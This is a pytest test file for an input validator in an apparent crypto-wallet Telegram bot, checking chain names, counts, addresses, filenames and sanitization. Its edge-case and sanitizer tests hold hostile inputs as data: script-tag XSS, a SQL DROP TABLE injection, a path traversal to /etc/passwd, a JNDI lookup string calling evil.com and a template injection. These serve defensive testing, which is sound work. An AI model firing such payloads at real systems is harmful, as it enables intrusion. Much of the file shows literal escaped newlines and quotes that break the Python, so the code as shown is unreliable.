"""
Comprehensive tests for input validation and sanitization.
"""
import pytest
from src.validators import InputValidator, ValidationError, safe_chain, safe_count, safe_address

class TestInputValidator:
    """Test the InputValidator class methods."""
    
    def test_sanitize_text_basic(self):
        """Test basic text sanitization."""
        # Normal text
        assert InputValidator.sanitize_text("Hello World") == "Hello World"
        
        # Text with extra whitespace
        assert InputValidator.sanitize_text("  Hello World  ") == "Hello World"
        
        # Text with safe punctuation
        assert InputValidator.sanitize_text("Hello, World!") == "Hello, World!"
        
        # Text exceeding max length
        long_text = "a" * 2000
        result = InputValidator.sanitize_text(long_text, max_length=100)
        assert len(result) == 100
    
    def test_sanitize_text_dangerous_characters(self):
        """Test removal of potentially dangerous characters."""
        # Script tags
        malicious = "<script>alert('xss')</script>"
        sanitized = InputValidator.sanitize_text(malicious)
        assert "<script>" not in sanitized
        assert "alert" in sanitized  # Content remains but tags removed
        
        # SQL injection attempts
        sql_inject = "'; DROP TABLE users; --"
        sanitized = InputValidator.sanitize_text(sql_inject)
        assert "DROP TABLE" in sanitized  # Words remain but dangerous chars removed
    
    def test_validate_chain_valid(self):
        """Test valid chain validation."""
        assert InputValidator.validate_chain("ETH") == "ETH"
        assert InputValidator.validate_chain("eth") == "ETH"
        assert InputValidator.validate_chain(" BTC ") == "BTC"
        assert InputValidator.validate_chain("POLYGON") == "POLYGON"
    
    def test_validate_chain_invalid(self):
        """Test invalid chain validation."""
        with pytest.raises(ValidationError) as excinfo:
            InputValidator.validate_chain("INVALID")\n        assert "Unsupported chain" in str(excinfo.value)
        
        with pytest.raises(ValidationError) as excinfo:
            InputValidator.validate_chain("")
        assert "Invalid chain format" in str(excinfo.value)
        
        with pytest.raises(ValidationError) as excinfo:
            InputValidator.validate_chain("123")
        assert "Invalid chain format" in str(excinfo.value)
        
        with pytest.raises(ValidationError) as excinfo:
            InputValidator.validate_chain(123)  # Not a string
        assert "Chain must be a string" in str(excinfo.value)
    
    def test_validate_bulk_count_valid(self):
        """Test valid bulk count validation."""
        assert InputValidator.validate_bulk_count("1") == 1
        assert InputValidator.validate_bulk_count("100") == 100
        assert InputValidator.validate_bulk_count("1000") == 1000
        assert InputValidator.validate_bulk_count(" 50 ") == 50
    
    def test_validate_bulk_count_invalid(self):
        """Test invalid bulk count validation."""
        # Zero or negative
        with pytest.raises(ValidationError):
            InputValidator.validate_bulk_count("0")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_bulk_count("-1")
        
        # Non-numeric
        with pytest.raises(ValidationError):
            InputValidator.validate_bulk_count("abc")
        
        # Too large
        with pytest.raises(ValidationError):
            InputValidator.validate_bulk_count("2000", max_count=1000)
        
        # Empty
        with pytest.raises(ValidationError):
            InputValidator.validate_bulk_count("")
        
        # Non-string input
        with pytest.raises(ValidationError):
            InputValidator.validate_bulk_count(123)
    
    def test_validate_address_ethereum(self):
        """Test Ethereum address validation."""
        valid_eth = "0x742d35Cc6551C304BB5b5D3BF07ff2C4d8D6B62D"
        assert InputValidator.validate_address(valid_eth, "ETH") == valid_eth
        
        # Invalid format
        with pytest.raises(ValidationError):
            InputValidator.validate_address("invalid_eth", "ETH")
        
        # Wrong length
        with pytest.raises(ValidationError):
            InputValidator.validate_address("0x123", "ETH")
    
    def test_validate_address_bitcoin(self):
        """Test Bitcoin address validation."""
        # Valid legacy address
        valid_btc_legacy = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        assert InputValidator.validate_address(valid_btc_legacy, "BTC") == valid_btc_legacy
        
        # Valid bech32 address
        valid_btc_bech32 = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
        assert InputValidator.validate_address(valid_btc_bech32, "BTC") == valid_btc_bech32
        
        # Invalid format
        with pytest.raises(ValidationError):
            InputValidator.validate_address("invalid_btc", "BTC")
    
    def test_validate_addresses_list(self):
        """Test validation of multiple addresses."""
        addresses_text = \"\"\"0x742d35Cc6551C304BB5b5D3BF07ff2C4d8D6B62D,
                            0x8ba1f109551bD432803012645Hac136c2B75B08\"\"\"\n        \n        # This should fail because second address is invalid\n        with pytest.raises(ValidationError):\n            InputValidator.validate_addresses_list(addresses_text, \"ETH\")\n        \n        # Valid addresses\n        valid_addresses = \"0x742d35Cc6551C304BB5b5D3BF07ff2C4d8D6B62D 0x8ba1f109551bD432803012645Hac136c2B75e28\"\n        result = InputValidator.validate_addresses_list(valid_addresses, \"ETH\")\n        assert len(result) == 2
    
    def test_validate_telegram_user_id(self):
        """Test Telegram user ID validation."""
        assert InputValidator.validate_telegram_user_id(\"123456789\") == 123456789\n        assert InputValidator.validate_telegram_user_id(123456789) == 123456789\n        assert InputValidator.validate_telegram_user_id(\" 123456789 \") == 123456789\n        \n        # Invalid formats\n        with pytest.raises(ValidationError):\n            InputValidator.validate_telegram_user_id(\"0\")  # Can't start with 0\n        \n        with pytest.raises(ValidationError):\n            InputValidator.validate_telegram_user_id(\"abc\")\n        \n        with pytest.raises(ValidationError):\n            InputValidator.validate_telegram_user_id(\"\")
    
    def test_validate_filename(self):
        """Test filename validation."""
        assert InputValidator.validate_filename(\"wallets.csv\") == \"wallets.csv\"\n        assert InputValidator.validate_filename(\"data_2025.zip\") == \"data_2025.zip\"\n        \n        # Directory traversal attempts\n        with pytest.raises(ValidationError):\n            InputValidator.validate_filename(\"../../../etc/passwd\")\n        \n        with pytest.raises(ValidationError):\n            InputValidator.validate_filename(\"folder/file.txt\")\n        \n        # Invalid characters\n        with pytest.raises(ValidationError):\n            InputValidator.validate_filename(\"file<>.txt\")\n    
    def test_validate_callback_data(self):\n        \"\"\"Test callback data validation.\"\"\"\n        assert InputValidator.validate_callback_data(\"gen:ETH\") == \"gen:ETH\"\n        assert InputValidator.validate_callback_data(\"wallet:clear\") == \"wallet:clear\"\n        \n        # Invalid characters\n        with pytest.raises(ValidationError):\n            InputValidator.validate_callback_data(\"gen<script>\")\n        \n        # Too long\n        with pytest.raises(ValidationError):\n            InputValidator.validate_callback_data(\"a\" * 100)
    
    def test_validate_hex_string(self):
        """Test hex string validation."""
        assert InputValidator.validate_hex_string(\"0x123abc\") == \"0x123abc\"\n        assert InputValidator.validate_hex_string(\"0x0\") == \"0x0\"\n        \n        # Invalid format\n        with pytest.raises(ValidationError):\n            InputValidator.validate_hex_string(\"123abc\")  # Missing 0x\n        \n        with pytest.raises(ValidationError):\n            InputValidator.validate_hex_string(\"0xGHI\")\n    
    def test_sanitize_for_display(self):\n        \"\"\"Test display sanitization.\"\"\"\n        assert InputValidator.sanitize_for_display(\"Hello World\") == \"Hello World\"\n        assert InputValidator.sanitize_for_display(\"<script>alert('xss')</script>\") == \"&lt;script&gt;alert('xss')&lt;/script&gt;\"\n        assert InputValidator.sanitize_for_display(\"A & B\") == \"A &amp; B\"\n        \n        # Length limiting\n        long_text = \"a\" * 200\n        result = InputValidator.sanitize_for_display(long_text, max_length=50)\n        assert len(result) == 50


class TestConvenienceFunctions:\n    \"\"\"Test the convenience validation functions.\"\"\"\n    \n    def test_safe_chain(self):\n        \"\"\"Test safe_chain convenience function.\"\"\"\n        assert safe_chain(\"ETH\") == \"ETH\"\n        assert safe_chain(\"btc\") == \"BTC\"\n        \n        with pytest.raises(ValidationError):\n            safe_chain(\"INVALID\")\n    \n    def test_safe_count(self):\n        \"\"\"Test safe_count convenience function.\"\"\"\n        assert safe_count(\"100\") == 100\n        assert safe_count(\"1\", max_count=1000) == 1\n        \n        with pytest.raises(ValidationError):\n            safe_count(\"0\")\n        \n        with pytest.raises(ValidationError):\n            safe_count(\"2000\", max_count=1000)\n    \n    def test_safe_address(self):\n        \"\"\"Test safe_address convenience function.\"\"\"\n        eth_addr = \"0x742d35Cc6551C304BB5b5D3BF07ff2C4d8D6B62D\"\n        assert safe_address(eth_addr) == eth_addr\n        assert safe_address(eth_addr, \"ETH\") == eth_addr\n        \n        with pytest.raises(ValidationError):\n            safe_address(\"invalid\", \"ETH\")


class TestEdgeCases:\n    \"\"\"Test edge cases and security scenarios.\"\"\"\n    \n    def test_unicode_handling(self):\n        \"\"\"Test handling of unicode characters.\"\"\"\n        # Unicode in text\n        unicode_text = \"Hello 世界 🌍\"\n        sanitized = InputValidator.sanitize_text(unicode_text)\n        # Should handle unicode gracefully\n        assert len(sanitized) > 0\n    \n    def test_very_long_inputs(self):\n        \"\"\"Test handling of extremely long inputs.\"\"\"\n        very_long = \"a\" * 100000\n        \n        # Should not crash and should be truncated\n        result = InputValidator.sanitize_text(very_long, max_length=1000)\n        assert len(result) == 1000\n    \n    def test_null_and_empty_inputs(self):\n        \"\"\"Test handling of null and empty inputs.\"\"\"\n        # Empty strings\n        with pytest.raises(ValidationError):\n            InputValidator.validate_chain(\"\")\n        \n        # Whitespace only\n        with pytest.raises(ValidationError):\n            InputValidator.validate_chain(\"   \")\n    \n    def test_injection_attempts(self):\n        \"\"\"Test various injection attempt patterns.\"\"\"\n        injection_attempts = [\n            \"'; DROP TABLE users; --\",\n            \"<script>alert('xss')</script>\",\n            \"../../../etc/passwd\",\n            \"${jndi:ldap://evil.com/a}\",\n            \"{{7*7}}\",\n            \"%00admin%00\",\n        ]\n        \n        for attempt in injection_attempts:\n            # Should not raise exceptions but should sanitize\n            sanitized = InputValidator.sanitize_text(attempt)\n            # Basic safety checks\n            assert \"<script>\" not in sanitized\n            assert \"../\" not in sanitized


if __name__ == \"__main__\":\n    pytest.main([__file__])"